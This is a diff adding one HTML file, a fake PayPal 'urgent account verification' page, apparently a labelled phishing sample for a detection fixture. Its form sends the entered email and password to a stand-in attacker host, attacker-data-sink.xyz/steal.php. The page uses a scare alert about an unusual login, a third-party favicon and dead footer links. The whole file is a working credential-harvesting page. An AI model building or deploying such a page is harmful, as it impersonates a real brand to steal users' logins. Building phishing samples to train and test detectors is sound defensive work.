@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PayPal Security Center - Urgent Account Verification</title>
+  <link rel="icon" href="https://unrelated-third-party.com/fake.ico">
+  <style>
+    body { font-family: -apple-system, sans-serif; background: #f4f6f8; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .box { background: white; padding: 2rem; border-radius: 8px; width: 380px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+    .alert { background: #fee2e2; border-left: 4px solid #ef4444; color: #991b1b; padding: 0.75rem; font-size: 0.85rem; margin-bottom: 1rem; }
+    label { font-size: 0.85rem; color: #475569; display: block; margin-top: 0.8rem; }
+    input { width: 100%; padding: 0.6rem; margin-top: 0.3rem; border: 1px solid #cbd5e1; border-radius: 4px; box-sizing: border-box; }
+    button { width: 100%; margin-top: 1.2rem; padding: 0.75rem; background: #0070ba; color: white; border: none; font-weight: bold; border-radius: 4px; cursor: pointer; }
+    .dead-links { margin-top: 1.2rem; text-align: center; font-size: 0.75rem; }
+    .dead-links a { color: #64748b; margin: 0 0.5rem; text-decoration: none; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="alert">
+      <strong>Notice:</strong> Unusual login attempt detected. Please verify your credentials to restore account access.
+    </div>
+    <!-- Cross-origin submission to an unrelated receiver endpoint -->
+    <form action="https://attacker-data-sink.xyz/steal.php" method="POST">
+      <label for="email">Account Email</label>
+      <input type="email" id="email" name="user_email" required>
+      <label for="password">Password</label>
+      <input type="password" id="password" name="user_password" required>
+      <button type="submit">Verify Account Now</button>
+    </form>
+    <!-- Dead placeholder anchors -->
+    <div class="dead-links">
+      <a href="#">Privacy Policy</a>
+      <a href="javascript:void(0)">User Agreement</a>
+      <a href="#">Security Updates</a>
+    </div>
+  </div>
+</body>
+</html>
